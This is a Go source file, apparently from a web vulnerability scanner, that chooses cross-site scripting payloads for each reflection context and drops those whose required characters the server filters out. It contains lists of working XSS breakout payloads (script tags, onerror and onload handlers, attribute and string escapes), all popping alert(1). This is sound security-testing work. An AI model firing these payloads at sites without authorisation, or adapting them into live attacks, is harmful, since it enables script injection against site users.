package xss

// SelectPayloads returns a set of XSS payloads tuned for the given
// reflection context and filtered by the characters that survived
// server-side encoding/filtering. The goal is to avoid wasting
// requests on payloads that will inevitably be neutered.
func SelectPayloads(ctx ContextType, chars CharacterSet) []string {
	candidates := payloadsForContext(ctx)
	if len(candidates) == 0 {
		return nil
	}

	var filtered []string
	for _, p := range candidates {
		if canUsePayload(p, chars) {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// payloadsForContext returns the raw payload candidates for a given
// context type. Each payload set is designed to break out of the
// surrounding context and achieve script execution.
func payloadsForContext(ctx ContextType) []string {
	switch ctx {
	case ContextHTMLText:
		return htmlTextPayloads
	case ContextAttribute:
		return attributePayloads
	case ContextAttributeUnquoted:
		return unquotedAttributePayloads
	case ContextScript:
		return scriptPayloads
	case ContextScriptString:
		return scriptStringPayloads
	case ContextHTMLComment:
		return commentPayloads
	case ContextStyle:
		return stylePayloads
	default:
		return nil
	}
}

// canUsePayload checks whether the payload's required characters all
// survived the server's filtering. A payload that needs < and > is
// useless if angle brackets are stripped.
func canUsePayload(payload string, chars CharacterSet) bool {
	needs := payloadRequirements(payload)

	if needs.AngleBrackets && !chars.AngleBrackets {
		return false
	}
	if needs.SingleQuote && !chars.SingleQuote {
		return false
	}
	if needs.DoubleQuote && !chars.DoubleQuote {
		return false
	}
	if needs.ForwardSlash && !chars.ForwardSlash {
		return false
	}
	if needs.Parentheses && !chars.Parentheses {
		return false
	}
	if needs.Backtick && !chars.Backtick {
		return false
	}
	if needs.Equals && !chars.Equals {
		return false
	}
	return true
}

// payloadRequirements scans a payload string and returns which special
// characters it depends on.
func payloadRequirements(payload string) CharacterSet {
	var needs CharacterSet
	for _, ch := range payload {
		switch ch {
		case '<', '>':
			needs.AngleBrackets = true
		case '\'':
			needs.SingleQuote = true
		case '"':
			needs.DoubleQuote = true
		case '/':
			needs.ForwardSlash = true
		case '`':
			needs.Backtick = true
		case '(', ')':
			needs.Parentheses = true
		case '=':
			needs.Equals = true
		}
	}
	return needs
}

// --- Payload sets by context ---
//
// Payloads are intentionally minimal: the analyzer's job is to confirm
// that code execution is structurally possible, not to deliver a full
// exploit chain. Each payload targets the most common breakout vector
// for its context.

// htmlTextPayloads break out by injecting new tags.
var htmlTextPayloads = []string{
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",
	"<svg/onload=alert(1)>",
	"<details open ontoggle=alert(1)>",
}

// attributePayloads break out of a quoted attribute value and inject
// an event handler or new tag.
var attributePayloads = []string{
	`" onfocus=alert(1) autofocus="`,
	`" onmouseover=alert(1) "`,
	`"><script>alert(1)</script>`,
	`"><img src=x onerror=alert(1)>`,
	`' onfocus=alert(1) autofocus='`,
	`'><script>alert(1)</script>`,
}

// unquotedAttributePayloads exploit missing quotes around attribute
// values -- a space or slash is enough to inject a new attribute.
var unquotedAttributePayloads = []string{
	" onfocus=alert(1) autofocus",
	" onmouseover=alert(1)",
	"><script>alert(1)</script>",
	"><img src=x onerror=alert(1)>",
}

// scriptPayloads inject into bare <script> blocks.
var scriptPayloads = []string{
	"</script><script>alert(1)</script>",
	";alert(1)//",
	";alert(1);",
}

// scriptStringPayloads break out of a JS string literal and execute
// code, then re-open a string so the trailing quote does not cause
// a syntax error.
var scriptStringPayloads = []string{
	`';alert(1)//`,
	`";alert(1)//`,
	`</script><script>alert(1)</script>`,
	"`-alert(1)-`",
}

// commentPayloads close the HTML comment and inject executable HTML.
var commentPayloads = []string{
	"--><script>alert(1)</script>",
	"--><img src=x onerror=alert(1)>",
}

// stylePayloads attempt CSS-based injection vectors. Modern browsers
// largely block expression() and -moz-binding, but </style> breakout
// is still viable.
var stylePayloads = []string{
	"</style><script>alert(1)</script>",
	"</style><img src=x onerror=alert(1)>",
}
